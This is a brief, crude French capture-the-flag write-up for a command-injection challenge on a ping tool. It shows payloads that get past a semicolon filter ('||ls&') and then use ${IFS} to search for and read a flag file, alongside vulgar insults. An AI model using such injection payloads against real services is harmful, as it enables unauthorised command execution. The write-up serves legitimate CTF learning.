# Writeup
Pas trop détaillé psq nik la poliss

## Recon
Pareil que le précédent :
```bash
ping -c 1 $ip
```

On teste la payload `;ls;` ça passe pas, **cheh** !
Faut tester des trucs là. `;` est filtré, comment faire pour injecter du code ?
```bash
||ls&
```
Permet de bypass le filtre c'est terrible.

## Exploit
Avec la payload trouvée juste avant on trouve les sous-dossiers :
```
.secret/
├── 1
│   ├── 1
│   │   ├── 1
│   │   ├── 2
│   │   └── 3
│   ├── 2
│   │   ├── 1
│   │   ├── 2
│   │   └── 3
│   └── 3
│       ├── 1
│       ├── 2
│       └── 3
├── 2
│   ├── 1
│   │   ├── 1
│   │   ├── 2
│   │   └── 3
│   │       └── flag.txt
│   ├── 2
│   │   ├── 1
│   │   ├── 2
│   │   └── 3
│   └── 3
│       ├── 1
│       ├── 2
│       └── 3
└── 3
    ├── 1
    │   ├── 1
    │   ├── 2
    │   └── 3
    ├── 2
    │   ├── 1
    │   ├── 2
    │   └── 3
    └── 3
        ├── 1
        ├── 2
        └── 3
```

C'est vraiment un enculé celui qui a fait ce chall. Pour trouver le flag simplement :
```bash
||grep${IFS}-r${IFS}FORMAT_DU_FLAG&
#output :
.secret/2/1/3/flag.txt

||cat${IFS}.secret/2/1/3/flag.txt&
```


## Résumé
```bash
||cat${IFS}.secret/2/1/3/flag.txt&
```
